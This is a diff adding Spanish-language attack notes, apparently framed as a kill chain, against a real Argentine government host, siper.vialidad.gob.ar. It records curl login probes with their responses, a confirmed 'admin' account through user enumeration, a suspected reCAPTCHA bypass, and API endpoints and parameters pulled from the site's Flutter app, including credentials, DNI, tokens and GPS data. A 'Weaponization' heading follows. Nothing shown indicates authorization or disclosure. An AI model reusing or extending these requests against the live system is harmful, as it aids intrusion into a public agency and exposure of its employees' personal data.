@@ -460,6 +460,38 @@ Recopilar información
    curl -k -X POST "https://siper.vialidad.gob.ar/go/app-index-x.php" \
      -d "accion=login&recaptcha_response=dummy&datastring=txtUsuario=admin&txtPassword=wrongpass"
   ```
+  Respuesta:
+   {"0":"admin","res":0,"msg":"Error[363] Tenés tu contraseña vencida."}
+
+  El usuario admin existe en el sistema.
+  El mensaje de error específico permite la enumeración de usuarios.
+  Posible bypass de reCAPTCHA v3 (entorno de desarrollo).
+
+- Análisis de la Aplicación Flutter (/app/)
+  - Archivos críticos descargados y analizados:
+      - flutter_service_worker.js: Control de caching.
+      - AssetManifest.json: Lista de recursos empaquetados.
+      - NOTICES: Licencias de terceros.
+      - main.dart.js: Código compilado de Flutter (ofuscado).
+ - Strings relevantes encontradas en main.dart.js:
+      - Parámetros: usuario_ad, password_ad, dni, token, token_ficho, foto, pdf, latlon, gerencia, subgerencia, division, seccion.
+      - Endpoints: https://siper.vialidad.gob.ar/app/api/presentte-api.php, https://siper.vialidad.gob.ar/app/event/event.php. 
+      - Endpoint Principal: https://siper.vialidad.gob.ar/app/api/presentte-api.php
+        Parámetros críticos:
+        usuario_ad, password_ad: Credenciales de autenticación.
+        dni: Documento Nacional de Identidad.
+        token, token_ficho: Tokens de sesión.
+        foto, pdf: Imágenes/documentos en base64.
+        latlon, gps_exactitud: Ubicación GPS.
+        gerencia, subgerencia, division, seccion: Estructura organizacional.
+        ```text
+        curl -k -X POST "https://siper.vialidad.gob.ar/app/api/presentte-api.php" \
+          -H "Content-Type: application/json" \
+          -d '{"accion":"login","usuario_ad":"admin","password_ad":"password_invalida","dni":"12345678"}'
+        ```
+    
+
+
 
 ## Weaponization
 - T1059 – Command and Scripting Interpreter
